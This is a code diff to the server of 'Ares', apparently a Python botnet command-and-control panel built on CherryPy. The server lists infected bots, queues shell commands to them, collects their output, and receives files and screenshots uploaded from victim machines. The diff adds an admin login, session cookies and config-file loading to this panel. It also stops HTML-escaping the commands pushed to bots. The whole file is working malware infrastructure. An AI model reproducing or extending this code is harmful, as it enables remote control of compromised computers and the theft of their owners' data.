@@ -5,13 +5,16 @@ import os
 import re
 import random
 import string
+import hashlib
 
 
-UPLOAD_DIR = os.path.join(os.path.dirname(os.path.realpath(__file__)), "uploads")
-if not os.path.exists(UPLOAD_DIR):
-    os.makedirs(UPLOAD_DIR)
+COOKIE_NAME = "ARESSESSID"
+SESSION_TIMEOUT = 300
+UPLOAD_DIR = ""
+
 pending_uploads = []
-
+session_cookie = None
+last_session_activity = 0
 
 html_escape_table = {
     "&": "&amp;",
@@ -20,6 +23,12 @@ html_escape_table = {
     ">": "&gt;",
     "<": "&lt;",
 }
+
+
+def error_page(status, message, traceback, version):
+    with open("error.html", "r") as f:
+        html = f.read()
+        return html % (status, status, message)
 
 
 def html_escape(text):
@@ -48,16 +57,93 @@ def exec_DB(sql, params=()):
     conn.close()
 
 
+def get_admin_password():
+    result = query_DB("SELECT password FROM users WHERE name='admin'")
+    if result:
+        return result[0][0]
+    else:
+        return None
+
+
+def set_admin_password(admin_password):
+    password_hash = hashlib.sha256()
+    password_hash.update(admin_password)
+    exec_DB("DELETE FROM users WHERE name='admin'")
+    exec_DB("INSERT INTO users VALUES (?, ?, ?)", (None, "admin", password_hash.hexdigest()))
+
+
+def require_admin(func):
+    def wrapper(*args, **kwargs):
+        global session_cookie
+        global last_session_activity
+        global SESSION_TIMEOUT
+        if session_cookie and COOKIE_NAME in cherrypy.request.cookie and session_cookie == cherrypy.request.cookie[COOKIE_NAME].value:
+            if time.time() - last_session_activity > SESSION_TIMEOUT:
+                raise cherrypy.HTTPRedirect("/disconnect")
+            else:
+                last_session_activity = time.time()
+                return func(*args, **kwargs)
+        else:
+            raise cherrypy.HTTPRedirect("/login")
+    return wrapper
+
+
 class Main(object):
     @cherrypy.expose
+    @require_admin
     def index(self):
         with open("Menu.html", "r") as f:
             html = f.read()
             return html
 
+    @cherrypy.expose
+    def login(self, password=''):
+        admin_password = get_admin_password()
+        if not admin_password:
+            if password:
+                set_admin_password(password)
+                return 'Admin password set successfully. <a href="./login">Click here to login</a>'
+            else:
+                with open("CreatePassword.html", "r") as f:
+                    html = f.read()
+                    return html
+        else:
+            password_hash = hashlib.sha256()
+            password_hash.update(password)
+            if password_hash.hexdigest() == get_admin_password():
+                global session_cookie
+                session_cookie = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(64))
+                cherrypy.response.cookie[COOKIE_NAME] = session_cookie
+                global last_session_activity
+                last_session_activity = time.time()
+                raise cherrypy.HTTPRedirect('/')
+            else:
+                with open("Login.html", "r") as f:
+                    html = f.read()
+                    return html
+
+    @cherrypy.expose
+    def disconnect(self):
+        session_cookie = None
+        cherrypy.response.cookie[COOKIE_NAME] = ''
+        cherrypy.response.cookie[COOKIE_NAME]['expires'] = 0
+        return 'You have been disconnected. <a href="./login">Click here to login</a>'
+
+    @cherrypy.expose
+    @require_admin
+    def passchange(self, password=''):
+        if password:
+                set_admin_password(password)
+                return 'Admin password changed successfully. <a href="./login">Click here to login</a>'
+        else:
+            with open("CreatePassword.html", "r") as f:
+                html = f.read()
+                return html
+
 
 class CNC(object):
     @cherrypy.expose
+    @require_admin
     def index(self):
         bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
         output = ""
@@ -70,6 +156,7 @@ class CNC(object):
             return html
 
     @cherrypy.expose
+    @require_admin
     def bot(self, botid):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
@@ -77,7 +164,7 @@ class CNC(object):
             html = f.read()
             html = html.replace("{{botid}}", botid)
             return html
-
+    
 
 class API(object):
     @cherrypy.expose
@@ -104,21 +191,32 @@ class API(object):
         exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), html_escape(output), html_escape(botid)))
 
     @cherrypy.expose
+    @require_admin
     def push(self, botid, cmd):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
-        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), html_escape(cmd), False, html_escape(botid)))
-        if cmd.startswith("upload "):
-            pending_uploads.append(cmd[len("upload "):])
+        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))
+        if "upload" in cmd:
+            uploads = cmd[cmd.find("upload"):]
+            up_cmds = [i for i in uploads.split("upload ") if i]
+            for upload in up_cmds:
+                end_pos = upload.find(";")
+                while end_pos > 0 and cmd[end_pos - 1] == '\\':
+                    end_pos = cmd.find(";", end_pos + 1)
+                upload_filename = upload
+                if end_pos != -1:
+                    upload_filename = upload_filename[:end_pos]
+                pending_uploads.append(os.path.basename(upload_filename))
         if cmd.startswith("screenshot"):
             pending_uploads.append("screenshot")
 
     @cherrypy.expose
+    @require_admin
     def stdout(self, botid):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
         output = ""
-        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC LIMIT 10', (botid,))
+        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC', (botid,))
         for entry in reversed(bot_output):
             output += "%s\n\n" % entry[2]
         bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
@@ -127,12 +225,15 @@ class API(object):
         return output
 
     @cherrypy.expose
-    def upload(self, botid, src, uploaded):
+    def uploadpsh(self, botid, src, file):
+        self.upload(botid, src, file)
+
+    @cherrypy.expose
+    def upload(self, botid, src='', uploaded=None):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
-        up_dir = os.path.join(UPLOAD_DIR, botid)
-        if not os.path.exists(up_dir):
-            os.makedirs(up_dir)
+        if not src:
+            src = uploaded.filename
         expected_file = src
         if expected_file not in pending_uploads and src.endswith(".zip"):
             expected_file = src.split(".zip")[0]
@@ -141,7 +242,12 @@ class API(object):
         elif "screenshot" in pending_uploads:
             pending_uploads.remove("screenshot")
         else:
+            print "Unexpected file: %s" % src
             raise cherrypy.HTTPError(403)
+        global UPLOAD_DIR
+        up_dir = os.path.join(UPLOAD_DIR, botid)
+        if not os.path.exists(up_dir):
+            os.makedirs(up_dir)
         while os.path.exists(os.path.join(up_dir, src)):
             src = "_" + src
         save_path = os.path.join(up_dir, src)
@@ -157,27 +263,19 @@ class API(object):
 
 
 def main():
-    config = {'global': {'server.socket_host': '127.0.0.1',
-                'server.socket_port': 8080,
-                'environment': 'production',
-                },
-                '/': {  
-                    'response.headers.server': "Ares",
-                },
-                '/static': {
-                    'tools.staticdir.on': True,
-                    'tools.staticdir.dir':  os.path.join(os.path.dirname(os.path.realpath(__file__)), "static")
-                },
-                '/uploads': {
-                    'tools.staticdir.on': True,
-                    'tools.staticdir.dir':  UPLOAD_DIR
-                },
-               }
     app = Main()
     app.api = API()
     app.cnc = CNC()
-    print "[*] Server started on %s:%s" % (config["global"]["server.socket_host"], config["global"]["server.socket_port"])
-    cherrypy.quickstart(app, config=config)
+    cherrypy.config.update("conf/server.conf")
+    app = cherrypy.tree.mount(app, "", "conf/server.conf")
+    app.merge({"/": { "error_page.default": error_page}})
+    print "[*] Server started on %s:%s" % (cherrypy.config["server.socket_host"], cherrypy.config["server.socket_port"])
+    global UPLOAD_DIR
+    UPLOAD_DIR = app.config['/uploads']['tools.staticdir.dir']
+    if not os.path.exists(UPLOAD_DIR):
+        os.makedirs(UPLOAD_DIR)
+    cherrypy.engine.start()
+    cherrypy.engine.block()
 
 
 if __name__ == "__main__":
